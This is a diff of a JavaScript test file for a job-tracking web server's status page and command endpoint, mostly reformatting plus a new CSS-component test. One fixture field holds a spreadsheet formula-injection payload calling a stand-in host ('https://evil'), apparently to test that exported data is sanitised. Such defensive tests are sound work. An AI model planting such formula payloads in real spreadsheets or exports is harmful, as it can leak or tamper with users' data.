@@ -138,20 +138,20 @@ const EXPECTED_CONTENT_SECURITY_POLICY = [
   "form-action 'self'",
   "frame-ancestors 'none'",
   "object-src 'none'",
-].join('; ');
+].join("; ");
 
 const EXPECTED_PERMISSIONS_POLICY = [
-  'accelerometer=()',
-  'autoplay=()',
-  'camera=()',
-  'geolocation=()',
-  'gyroscope=()',
-  'microphone=()',
-  'payment=()',
-  'usb=()',
-].join(', ');
+  "accelerometer=()",
+  "autoplay=()",
+  "camera=()",
+  "geolocation=()",
+  "gyroscope=()",
+  "microphone=()",
+  "payment=()",
+  "usb=()",
+].join(", ");
 
-const EXPECTED_REFERRER_POLICY = 'strict-origin-when-cross-origin';
+const EXPECTED_REFERRER_POLICY = "strict-origin-when-cross-origin";
 
 afterEach(async () => {
   while (activeServers.length > 0) {
@@ -395,10 +395,41 @@ describe("web server status page", () => {
     expect(css).toContain("--jobbot-color-danger");
     expect(css).toContain("--jobbot-color-text-primary");
     expect(css).toContain("--jobbot-color-text-secondary");
-    expect(css).toMatch(/body\s*\{[^}]*color:\s*var\(--jobbot-color-text-primary\)/);
+    expect(css).toMatch(
+      /body\s*\{[^}]*color:\s*var\(--jobbot-color-text-primary\)/,
+    );
     expect(css).toMatch(
       /\.status-panel[^{}]*\{[^}]*background-color:[^;\n]*var\([^)]*--jobbot-color-surface/,
     );
+  });
+
+  it("exposes reusable component styles for buttons, tables, timelines, and badges", async () => {
+    const server = await startServer();
+
+    const homepage = await fetch(`${server.url}/`);
+    expect(homepage.status).toBe(200);
+    const html = await homepage.text();
+    const dom = new JSDOM(html);
+
+    const buttons = dom.window.document.querySelectorAll("button.hub-button");
+    expect(buttons.length).toBeGreaterThan(0);
+
+    const table = dom.window.document.querySelector("table.hub-table");
+    expect(table).not.toBeNull();
+
+    const timeline = dom.window.document.querySelector(".hub-timeline");
+    expect(timeline).not.toBeNull();
+
+    const asset = await fetch(`${server.url}/assets/status-hub.css`);
+    expect(asset.status).toBe(200);
+    const css = await asset.text();
+
+    expect(css).toContain(".hub-button");
+    expect(css).toContain("min-height:2.75rem");
+    expect(css).toContain(".hub-table");
+    expect(css).toContain(".hub-timeline");
+    expect(css).toContain(".hub-status-badge");
+    expect(css).toMatch(/@media\s*\(max-width:\s*720px\)/);
   });
 
   it("applies strict security headers to the status hub", async () => {
@@ -662,7 +693,7 @@ describe("web server status page", () => {
         id: "job-1",
         metadata: {
           location: "Remote",
-          level: "=IMPORT(\"https://evil\")",
+          level: '=IMPORT("https://evil")',
           compensation: "$185k",
           synced_at: "2025-03-01T00:00:00.000Z",
         },
@@ -892,7 +923,14 @@ describe("web server status page", () => {
       stdout: JSON.stringify({ total: 0, offset: 0, limit: 10, items: [] }),
       stderr: "",
       returnValue: 0,
-      data: { total: 0, offset: 0, limit: 10, items: [], filters: {}, hasMore: false },
+      data: {
+        total: 0,
+        offset: 0,
+        limit: 10,
+        items: [],
+        filters: {},
+        hasMore: false,
+      },
     };
     const recruiterData = {
       opportunity: {
@@ -948,7 +986,9 @@ describe("web server status page", () => {
     await waitForEvent("jobbot:applications-loaded");
     expect(commandAdapter["shortlist-list"]).toHaveBeenCalledTimes(1);
 
-    const openButton = dom.window.document.querySelector("[data-recruiter-open]");
+    const openButton = dom.window.document.querySelector(
+      "[data-recruiter-open]",
+    );
     expect(openButton).not.toBeNull();
     openButton?.dispatchEvent(
       new dom.window.MouseEvent("click", { bubbles: true, cancelable: true }),
@@ -958,7 +998,9 @@ describe("web server status page", () => {
     expect(modal).not.toBeNull();
     expect(modal?.hasAttribute("hidden")).toBe(false);
 
-    const textarea = dom.window.document.querySelector("[data-recruiter-input]");
+    const textarea = dom.window.document.querySelector(
+      "[data-recruiter-input]",
+    );
     expect(textarea).not.toBeNull();
     if (textarea) {
       textarea.value = "Subject: Future Works recruiter outreach";
@@ -974,7 +1016,7 @@ describe("web server status page", () => {
     );
 
     const ingestedEvent = await ingestedPromise;
-    await new Promise(resolve => dom.window.setTimeout(resolve, 0));
+    await new Promise((resolve) => dom.window.setTimeout(resolve, 0));
 
     expect(commandAdapter["recruiter-ingest"]).toHaveBeenCalledTimes(1);
     expect(commandAdapter["recruiter-ingest"]).toHaveBeenCalledWith({
@@ -982,10 +1024,14 @@ describe("web server status page", () => {
     });
     expect(commandAdapter["shortlist-list"]).toHaveBeenCalledTimes(2);
 
-    const message = dom.window.document.querySelector("[data-recruiter-message]");
+    const message = dom.window.document.querySelector(
+      "[data-recruiter-message]",
+    );
     expect(message?.textContent).toContain("Future Works");
 
-    const preview = dom.window.document.querySelector("[data-recruiter-preview]");
+    const preview = dom.window.document.querySelector(
+      "[data-recruiter-preview]",
+    );
     expect(preview?.textContent).toContain("Future Works");
     expect(preview?.textContent).toContain("Subject");
     expect(preview?.textContent).toContain("Future Works recruiter outreach");
@@ -1024,7 +1070,7 @@ describe("web server status page", () => {
       }),
     };
     commandAdapter.shortlistList = commandAdapter["shortlist-list"];
-    
+
     const server = await startServer({ commandAdapter });
     const { dom, boot } = await renderStatusDom(server, {
       pretendToBeVisual: true,
@@ -3196,8 +3242,16 @@ describe("web server command endpoint", () => {
       commandAdapter,
       auth: {
         tokens: [
-          { token: "viewer-token", subject: "viewer@example.com", roles: ["viewer"] },
-          { token: "editor-token", subject: "editor@example.com", roles: ["editor"] },
+          {
+            token: "viewer-token",
+            subject: "viewer@example.com",
+            roles: ["viewer"],
+          },
+          {
+            token: "editor-token",
+            subject: "editor@example.com",
+            roles: ["editor"],
+          },
         ],
         scheme: "Bearer",
       },
@@ -3233,10 +3287,13 @@ describe("web server command endpoint", () => {
     expect(editorResponse.status).toBe(200);
     await editorResponse.json();
 
-    const viewerHistory = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: viewerHeaders,
-    });
+    const viewerHistory = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: viewerHeaders,
+      },
+    );
     expect(viewerHistory.status).toBe(200);
     const viewerBody = await viewerHistory.json();
     expect(viewerBody.entries).toEqual([
@@ -3247,10 +3304,13 @@ describe("web server command endpoint", () => {
       },
     ]);
 
-    const editorHistory = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: editorHeaders,
-    });
+    const editorHistory = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: editorHeaders,
+      },
+    );
     expect(editorHistory.status).toBe(200);
     const editorBody = await editorHistory.json();
     expect(editorBody.entries).toEqual([
@@ -3378,13 +3438,16 @@ describe("web server command endpoint", () => {
     expect((guest2Session ?? "").trim()).not.toBe("");
     expect(guest2Session).not.toBe(guest1Session);
 
-    const guest1History = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: {
-        ...guest1Headers,
-        [sessionHeader]: guest1Session,
+    const guest1History = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: {
+          ...guest1Headers,
+          [sessionHeader]: guest1Session,
+        },
       },
-    });
+    );
     expect(guest1History.status).toBe(200);
     const guest1Body = await guest1History.json();
     expect(guest1Body.entries).toEqual([
@@ -3395,13 +3458,16 @@ describe("web server command endpoint", () => {
       },
     ]);
 
-    const guest2History = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: {
-        ...guest2Headers,
-        [sessionHeader]: guest2Session,
+    const guest2History = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: {
+          ...guest2Headers,
+          [sessionHeader]: guest2Session,
+        },
       },
-    });
+    );
     expect(guest2History.status).toBe(200);
     const guest2Body = await guest2History.json();
     expect(guest2Body.entries).toEqual([
